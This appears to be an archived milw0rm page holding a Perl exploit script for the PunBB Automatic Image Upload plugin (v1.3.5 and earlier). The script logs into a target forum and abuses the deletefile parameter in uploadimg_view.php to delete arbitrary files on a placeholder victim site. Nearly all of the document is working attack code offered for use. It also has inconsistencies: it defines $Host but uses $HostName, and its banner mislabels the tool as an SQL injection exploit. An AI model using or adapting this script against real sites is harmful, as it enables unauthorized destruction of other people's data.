<html><head><title>PunBB Automatic Image Upload <= 1.3.5 Delete Arbitrary File Exploit</title></head><pre>#!/usr/bin/perl
#[0-Day] PunBB Automatic Image Upload &lt;= v1.3.5 Delete Arbitrary File Vulnerability
#Coded By Dante90, WaRWolFz Crew
#Bug Discovered By: Dante90, WaRWolFz Crew
#Works only if '$Allow_Delete[] = &quot;[USERGROUP]&quot;;' is not commented in &quot;uploadimg_config.php&quot; [FIND LINE: 75]. Example:
#//$Allow_Delete[] = &quot;Members&quot;; =&gt; $Allow_Delete[] = &quot;Members&quot;;

use LWP::UserAgent;
use HTTP::Cookies;

my ($UserName,$PassWord,$DirectoryFile,$DeleteFile) = @ARGV;

if(@ARGV &lt; 4){
    &amp;usage();
    exit();
}

my $Message = &quot;&quot;;
my $Host = &quot;http://www.victime_site.org/path/&quot;; #Insert Victime Web Site Link
my $Referrer = &quot;http://www.warwolfz.com/&quot;;

my $Cookies = new HTTP::Cookies;
my $UserAgent = new LWP::UserAgent(
            agent =&gt; 'Mozilla/5.0',
            max_redirect =&gt; 0,
            cookie_jar =&gt; $Cookies,
        ) or die $!;

sub Login(){
    my $Login = $UserAgent-&gt;post($HostName.'/login.php?action=in',
                [
                    form_sent        =&gt; '1',
                    redirect_url    =&gt; 'index.php',
                    req_username    =&gt; $UserName,
                    req_password    =&gt; $PassWord,
                    login =&gt; 'Login',
                ]) || die $!;

    if($Login-&gt;content =~ /Logged in /i){
        return 1;
    }else{
        return 0;
    }
}

if (Login() == 1){
    $Message = &quot; * Logged in as: &quot; . $UserName;
}elsif (Login() == 0){
    $Message = &quot; * Login Failed.&quot;;
}

my $Get = $UserAgent-&gt;get($HostName.&quot;./uploadimg_view.php?view=gallery&amp;p=1&amp;deletefile=./&quot;.$DirectoryFile.&quot;/&quot;.$DeleteFile);
my $GetFile = $UserAgent-&gt;get($HostName.&quot;./uploads/&quot;.$DirectoryFile.$DeleteFile);

if($Get-&gt;content =~ /&lt;b&gt;Warning&lt;\/b&gt;: /i){
    refresh($Message, $HostName, &quot;&quot;, &quot;&quot;);
    print &quot; * Error deleting sensible data.\n&quot;;
    print &quot; * Exploit Failed                                     *\n&quot;;
    print &quot; ------------------------------------------------------ \n\n&quot;;
}elsif ($GetFile-&gt;as_string =~ /404 Not Found/i){
    refresh($Message, $HostName, $DirectoryFile, $DeleteFile);
    print &quot; * File Deleted                                       *\n&quot;;
    print &quot; * Exploit Successed                                  *\n&quot;;
    print &quot; ------------------------------------------------------\n\n&quot;;
    system(&quot;pause&quot;);
}else{
    refresh($Message, $HostName, &quot;&quot;, &quot;&quot;);
    print &quot; * General Error. Maybe the file was deleted the same ;)\n&quot;;
    print &quot; * Control manually: &quot;.$HostName.&quot;./uploads/&quot;.$DirectoryFile.$DeleteFile.&quot;\n&quot;;
    print &quot; * Error deleting sensible data.\n&quot;;
    print &quot; * Exploit Failed                                     *\n&quot;;
    print &quot; ------------------------------------------------------ \n\n&quot;;
}

sub usage{
    system(&quot;cls&quot;);
    {
        print &quot; \n [0-Day] PunBB Automatic Image Upload &lt;= v1.3.5 Remote SQL Injection Exploit\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
        print &quot; * USAGE:                                             *\n&quot;;
        print &quot; * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n&quot;;
        print &quot; * perl name_exploit.pl [id]                          *\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
        print &quot; *         Powered By Dante90, WaRWolFz Crew          *\n&quot;;
        print &quot; * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
    };
    exit;
}

sub refresh{
    system(&quot;cls&quot;);
    {
        print &quot; \n [0-Day] PunBB Automatic Image Upload &lt;= v1.3.5 Remote SQL Injection Exploit\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
        print &quot; * USAGE:                                             *\n&quot;;
        print &quot; * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n&quot;;
        print &quot; * perl name_exploit.pl [id]                          *\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
        print &quot; *         Powered By Dante90, WaRWolFz Crew          *\n&quot;;
        print &quot; * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
    };
    print $_[0] .&quot;\n&quot;;
    print &quot; * Victime Site: &quot; . $_[1] . &quot;\n&quot;;
    print &quot; * Directory: &quot; . $_[2] . &quot;\n&quot;;
    print &quot; * File: &quot; . $_[3] . &quot;\n&quot;;
}

#WaRWolFz Crew

# milw0rm.com [2009-07-27]</pre></html>